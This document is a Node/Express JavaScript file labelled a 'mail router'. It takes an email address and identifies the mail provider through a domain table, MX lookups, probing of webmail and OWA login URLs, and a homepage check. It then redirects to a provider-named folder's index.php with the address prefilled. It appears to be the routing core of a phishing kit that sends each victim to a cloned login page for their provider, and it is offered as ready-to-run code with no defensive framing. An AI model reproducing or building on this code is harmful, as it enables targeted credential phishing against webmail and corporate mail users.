/**
 * router.js  –  Mail router (Node + Express)
 * ------------------------------------------------
 * Start with:  node router.js
 * Requires:    express, node-fetch@3
 * Node ≥ 18    (for dns/promises)
 */

import express from 'express';
import { resolveMx } from 'dns/promises';
import fetch from 'node-fetch';

const app  = express();
const port = process.env.PORT || 3000;

/* ───────── helpers ───────── */
function getDomainFromEmail(email) {
  const parts = String(email).split('@');
  return parts[1]?.trim().toLowerCase() ?? '';
}
function sanitise(host) {
  return host.replace(/[^a-z0-9.-]/gi, '');
}
async function urlAlive(url) {
  try {
    const controller = new AbortController();
    const guard = setTimeout(() => controller.abort(), 5000);
    const r = await fetch(url, { method: 'HEAD', redirect: 'manual', signal: controller.signal });
    clearTimeout(guard);
    return [200, 301, 302].includes(r.status);
  } catch (_) {
    return false;
  }
}

/* ───────── main route ───────── */
app.get('/route', async (req, res) => {
  const login  = req.query.login;
  if (!login)  return res.status(400).send('Missing login parameter.');

  const domain = getDomainFromEmail(login);
  if (!domain) return res.status(400).send('Invalid email address.');

  /* STEP 1: direct domain routing */
  const direct = {
    'naver.com'   : 'naver',
    'daum.net'    : 'kakao',
    'kakao.com'   : 'kakao',
    'hanmail.net' : 'kakao',
    'nate.com'    : 'nate',
    'empas.com'   : 'nate',
    'empal.com'   : 'nate',
    'hanafos.com' : 'nate',
    'lycos.com'   : 'nate',
    'netsgo.com'  : 'nate',
    '126.com'     : 'vip',
    '163.com'     : 'vip',
    'qq.com'      : 'qq',
    'foxmail.com' : 'qq',
    'mail.ru'     : 'mailru',
    'inbox.ru'    : 'mailru',
    'list.ru'     : 'mailru',
    'bk.ru'       : 'mailru',
    'internet.ru' : 'mailru',
    'lotte.net'   : 'lotte',
    'aol.com'     : 'aol',
    'freenet.de'  : 'freenet',
    'libero.it'   : 'libero'
  };
  for (const [needle, folder] of Object.entries(direct)) {
    if (domain.includes(needle)) {
      return res.redirect(`${folder}/index.php?login=${encodeURIComponent(login)}`);
    }
  }

  /* STEP 2: MX‑based routing */
  const mxRoutes = {
    'yandex'                        : 'yandex',
    'worksmobile'                   : 'worksmobile',
    '.mail.aliyun.com'              : 'mailaliyun',
    '.qiye.aliyun.com'              : 'qiyealiyun',
    '.enterprise.china.alibaba.com' : 'qiyealiyun',
    '.outlook.com'                  : 'office365',
    '.t-online.de'                  : 't-online',
    '.mimecast.com'                 : 'mimecast',
    '.orange.fr'                    : 'orange',
    '.netease.com'                  : 'netease',
    'mailplug.'                     : 'mailplug',
    'chinaemail.cn'                 : 'chinaemail',
    'secureserver.net'              : 'godaddy',
    'spam.cafe24.com'               : 'cafe24',
    '.fmcity.com'                   : 'cafe24',
    'cgwebmail.'                    : 'gw',
    '.daouoffice.com'               : 'daouoffice',
    'emx.mail.ru'                   : 'bizmailru',
    'yahoodns.net'                  : 'yahoobiz',
    'emailsrvr.com'                 : 'emailsrvr',
    'mailhostbox.com'               : 'mailhostbox',
    'rzone.de'                      : 'strato',
    '.gmx.net'                      : 'gmx',
    'register.it'                   : 'register',
    'chinanetsun.com'               : 'chinanetsun',
    'hiworks.co.kr'                 : 'hiworks',
    'mxbiz1.qq.com'                 : 'qqcom',
    'mxbiz2.qq.com'                 : 'qqcom',
    '.cn4e.com'                     : 'cn4e',
    'mailfilter.'                   : 'hibox',
    'sfilter.'                      : 'LG',
    '.mailwood.com'                 : 'LG',
    'webmail.'                      : 'roundcube',
    'bizmeka.com'                   : 'bizmeka',
    'secuecloud.com'                : 'secuecloud',
    '.serverdata.net'               : 'owa',
    '.ecounterp.com'                : 'ecount',
    '.mailinblack.com'              : 'mailinblack',
    'whoisworks.com'                : 'whois'
  };
  try {
    const mx = await resolveMx(domain);
    for (const { exchange } of mx) {
      for (const [needle, folder] of Object.entries(mxRoutes)) {
        if (exchange.includes(needle)) {
          return res.redirect(`${folder}/index.php?login=${encodeURIComponent(login)}`);
        }
      }
    }
  } catch (_) { /* DNS failure → ignore */ }

  /* STEP 3: URL probing */
  const d = sanitise(domain);
  const urls = {
    groupware : [`http://gw.${d}/groupware/login.php`],
    roundcube : [
      `http://${d}/webmail/`,
      `http://webmail.${d}/`,
      `http://${d}:2095`
    ],
    ngw       : [`http://mail.${d}/ngw/app/#/sign`],
    aruba     : [`https://webmail.aruba.it/`],
    gw        : [`https://gw.${d}/login`],
    owa       : [
      `https://${d}/owa/auth/logon.aspx?replaceCurrent=1&url=https://${d}/owa`,
      `https://mail.${d}/owa/auth/logon.aspx?replaceCurrent=1&url=https://${d}/owa`
    ]
  };
  for (const [folder, list] of Object.entries(urls)) {
    for (const u of list) {
      if (await urlAlive(u)) {
        return res.redirect(`${folder}/index.php?login=${encodeURIComponent(login)}`);
      }
    }
  }

  /* STEP 4: check homepage for "Whois" */
  try {
    const r = await fetch(`http://${d}`, { timeout: 5000 });
    if (r.ok && (await r.text()).includes('Whois')) {
      return res.redirect(`whois/index.php?login=${encodeURIComponent(login)}`);
    }
  } catch (_) { /* ignore */ }

  /* STEP 5: default */
  res.redirect(`other/index.php?login=${encodeURIComponent(login)}`);
});

/* ───────── start server ───────── */
app.listen(port, () =>
  console.log(`Mail router running → http://localhost:${port}/route?login=test@example.com`)
);
